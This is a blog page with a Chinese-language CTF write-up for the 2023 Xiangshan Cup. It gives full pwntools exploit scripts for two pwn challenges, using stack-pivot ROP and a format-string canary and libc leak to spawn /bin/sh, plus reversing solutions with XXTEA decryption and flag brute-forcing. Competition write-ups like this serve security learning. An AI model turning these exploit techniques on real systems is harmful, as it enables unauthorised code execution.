@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="香山杯," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Pwnmove简单的栈迁移">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 香山杯">
+<meta property="og:url" content="https://pursuezhou.github.io/2023/10/18/CTF/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="Pwnmove简单的栈迁移">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231018160558969.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016180022997.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016181820654.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016183700402.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016204435223.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016203115084.png">
+<meta property="article:published_time" content="2023-10-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-13T12:09:29.129Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="香山杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231018160558969.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://pursuezhou.github.io/2023/10/18/CTF/2023香山杯/"/>
+
+
+
+
+
+  <title>2023 香山杯 | Pursue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pursue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2023/10/18/CTF/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/wechat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2023 香山杯</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-18T00:00:00+08:00">
+                2023-10-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="move"><a href="#move" class="headerlink" title="move"></a>move</h3><p>简单的栈迁移</p>
+<span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = p64(<span class="number">0x0000000000401353</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pld += p64(<span class="number">0x0000000000401264</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;travel again!\n&quot;</span>, pld)</span><br><span class="line">sh.sendafter(<span class="string">&quot;setp number&quot;</span>, p32(<span class="number">0x12345678</span>))</span><br><span class="line"></span><br><span class="line">pld = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0x00000000004050A0</span>-<span class="number">8</span>) + p64(<span class="number">0x000000000040124b</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;TaiCooLa&quot;</span>, pld)</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pld = p64(<span class="number">0x0000000000401353</span>) + p64(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sh.sendafter(<span class="string">&quot;travel again!\n&quot;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h3><p>查看python可调用的后缀：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib.machinery</span><br><span class="line"><span class="built_in">print</span>(importlib.machinery.all_suffixes())</span><br><span class="line"><span class="comment"># [&#x27;.py&#x27;, &#x27;.pyc&#x27;, &#x27;.cpython-310-x86_64-linux-gnu.so&#x27;, &#x27;.abi3.so&#x27;, &#x27;.so&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p>用python调用了so文件，首先就是一顿乱试，发现只有功能1有问题，会返回给我们不可见的字符，推测应该是输出了栈上残留的信息。IDA里面通过字符串找到了功能1的函数，发现了一个格式化字符串和一个栈溢出。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231018160558969.png" alt="image-20231018160558969"></p>
+<p>找libc是个难点，感觉本地还好，到了远程可能LibcSearcher也不上什么忙了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = process([<span class="string">&quot;python3.7&quot;</span>, <span class="string">&quot;main.py&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&quot;./app.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give you a gift &quot;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x68b0</span></span><br><span class="line">success(<span class="string">&quot;code_base : &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;%p&quot;</span> * <span class="number">100</span>)</span><br><span class="line">sh.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">txt = sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">set</span>(txt.split(<span class="string">b&#x27;0x&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) == <span class="number">16</span> <span class="keyword">and</span> i[-<span class="number">2</span>:] == <span class="string">b&#x27;00&#x27;</span>:</span><br><span class="line">        canary = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + i, <span class="number">16</span>)</span><br><span class="line">        success(<span class="string">&quot;canary : &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(<span class="string">b&#x27;0x7f&#x27;</span> + txt.split(<span class="string">b&#x27;0x7f&#x27;</span>)[<span class="number">2</span>][<span class="number">0</span>:<span class="number">10</span>], <span class="number">16</span>) - <span class="number">0x114a21</span></span><br><span class="line">success(<span class="string">&quot;libc_base : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line">sh.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x108</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(code_base + <span class="number">0x000000000000301a</span>)</span><br><span class="line">pld += p64(code_base + <span class="number">0x0000000000003f8f</span>)</span><br><span class="line">pld += p64(libc_base + <span class="number">0x1d8698</span>)</span><br><span class="line">pld += p64(libc_base + <span class="number">0x50d70</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="url从哪里来"><a href="#url从哪里来" class="headerlink" title="url从哪里来"></a>url从哪里来</h3><p>动态调试发现在用户Temp目录下创建了一个文件，然后创建了子进程执行创建的文件。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016180022997.png" alt="image-20231016180022997"></p>
+<p>把创建的文件拖出来进行分析，发现在开头对字符串进行base64，结果放到一个堆块里，然后释放了，点开来发现是flag。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016181820654.png" alt="image-20231016181820654"></p>
+<h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><p>一开始还以为是apk逆向，后来看看题目名字琢磨一下应该是找一个python文件。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016183700402.png" alt="image-20231016183700402"></p>
+<p>注意拉取的时候要给root权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\adb.exe root</span><br><span class="line">.\adb.exe pull /data/data/com.mz.pytest/files/chaquopy/AssetFinder/app/__pycache__/hello.cpython-38.pyc C:\Users\13106\Desktop</span><br></pre></td></tr></table></figure>
+
+<p>有一点混淆在里面，去除混淆后找到特证发现是xxtea加密，没有改什么，网上脚本一把嗦：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">9</span>] = &#123;<span class="number">689085350</span>, <span class="number">626885696</span>, <span class="number">1894439255</span>, <span class="number">1204672445</span>, <span class="number">1869189675</span>, <span class="number">475967424</span>, <span class="number">1932042439</span>, <span class="number">1280104741</span>, <span class="number">2808893494</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">12345678</span>, <span class="number">12398712</span>, <span class="number">91283904</span>, <span class="number">12378192</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    sum = rounds*delta;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">        e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p<span class="number">-1</span>];</span><br><span class="line">            v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">            y = v[p];</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        sum = sum-delta;</span><br><span class="line">     &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;v[i]+<span class="number">0</span>),*((<span class="type">char</span>*)&amp;v[i]+<span class="number">1</span>),*((<span class="type">char</span>*)&amp;v[i]+<span class="number">2</span>),*((<span class="type">char</span>*)&amp;v[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="nesting"><a href="#nesting" class="headerlink" title="nesting"></a>nesting</h3><p>乍一看像是VM，第一个函数应该初始化用的，第二个就是处理指令的函数，没有什么思路，看了看团队的WP，顺着自己尝试一下。首先是发现程序存在两处比较，而且都是比较一个字符，那么猜测应该是逐字符比较，可以用爆破。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016204435223.png" alt="image-20231016204435223"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231016203115084.png" alt="image-20231016203115084"></p>
+<p>通过调试发现<code>case 0x28</code>才是真正判断的语句。一来是因为断在0x29的地方会发现运行不会给提示，而断在0x28的地方运行会有提示；二来会发现在0x28分支中的变量v8的初始值是和我们输入字符串的长度有关，并且执行次数是和我们输入字符串正否有关的，很明显输入<code>flag</code>和输入<code>faaa</code>的执行次数是完全不一样的，而且是可以计数的。</p>
+<p>为了方便爆破，我修改了程序的代码，使得当进入0x28这个分支的时候打印出一段固定的字符串。测试下来发现，进入分支0x28的次数是：输入字符串的长度 + 2 + 正确字符个数 * 2，也就是说当输入<code>fa</code>，打印了6次。用这样的方法我爆破出了一半的flag，<code>flag&#123;2c7c093b-f6</code>，但是接着爆破就不满足上面的条件了，所以干脆取最大值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./nesting_patch&quot;)</span></span><br><span class="line"><span class="comment"># sh.sendafter(&#x27;Input your flag:&#x27;, b&#x27;fl&#x27;)</span></span><br><span class="line"><span class="comment"># print(sh.recv().count(b&#x27;$\x00\x00\x004&#x27;))</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">table = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">&#x27;-_&#123;&#125;?\/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(table)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) + <span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    maxcount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        sh = process(<span class="string">&quot;./nesting_patch&quot;</span>)</span><br><span class="line">        tmp = flag + j</span><br><span class="line">        sh.sendafter(<span class="string">&#x27;Input your flag:&#x27;</span>, tmp)</span><br><span class="line">        x = sh.recvrepeat(<span class="number">1</span>).count(<span class="string">b&#x27;$\x00\x00\x004&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> x &gt; maxcount:</span><br><span class="line">            maxcount = x</span><br><span class="line">            right = j</span><br><span class="line">        sh.close()</span><br><span class="line"></span><br><span class="line">    flag += right</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> right == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E9%A6%99%E5%B1%B1%E6%9D%AF/" rel="tag"># 香山杯</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/10/04/Penetration/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/" rel="next" title="bugku 渗透测试2">
+                <i class="fa fa-chevron-left"></i> bugku 渗透测试2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/10/22/CTF/2023%E7%A7%91%E6%9D%A5%E6%9D%AF/" rel="prev" title="2023 科来杯">
+                2023 科来杯 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/wechat.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
